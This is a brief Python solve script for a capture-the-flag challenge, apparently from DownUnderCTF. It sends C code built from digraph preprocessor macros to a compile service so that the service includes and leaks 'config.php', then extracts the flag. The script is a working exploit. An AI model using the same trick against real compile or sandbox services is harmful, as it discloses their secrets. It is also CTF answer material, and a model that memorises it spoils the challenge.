# solution by @joseph

import re
from requests import post

solv = '''
//struct { for( int main(
typedef struct {
    int requirements; 
    int requirement_descriptions;
    int title;
    int secret_key;
} wa;
%:define dbg_log(...) 
%:define class ;struct
%:define public int
%:define function int
%:define $secret_key asdf;}
%:define $requirement_descriptions asdf;}
%:define __construct(X, Y) X(wa* $this, int $reqs, int $descs, int $title, int $f){
%:define TestConfig(...) "0"
%:define AppConfig(X, Y) Y%:%:;
%:define $test_config ;char* n
%:define new (char*)
%:define $app_config char* p

0
%:include "config.php"
'''

r = post('http://0.0.0.0', data={'code': solv, 'id': 'zxcv1234'})
flag = re.findall('DUCTF{.*}', r.text)[0]
print(flag)
